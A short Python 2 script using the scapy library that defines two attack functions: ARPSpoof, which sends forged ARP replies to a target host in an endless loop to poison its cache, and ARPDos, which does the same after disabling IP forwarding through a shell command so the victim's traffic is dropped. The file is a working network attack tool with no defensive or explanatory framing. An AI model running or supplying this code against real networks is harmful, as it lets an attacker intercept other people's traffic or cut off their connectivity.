from scapy.all import *

def ARPSpoof(IP,IPTarget):
	print "Starting..."
	arp = ARP(op=ARP.is_at,psrc=IP,pdst=IPTarget)
	while True:
		time.sleep(1)
		send(arp, verbose=False)

def ARPDos(IP,IPTarget):
    	print "Starting..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward ")
	arp = ARP(op=ARP.is_at,psrc=IP,pdst=IPTarget)
	while True:
		time.sleep(1)
		send(arp, verbose=False)
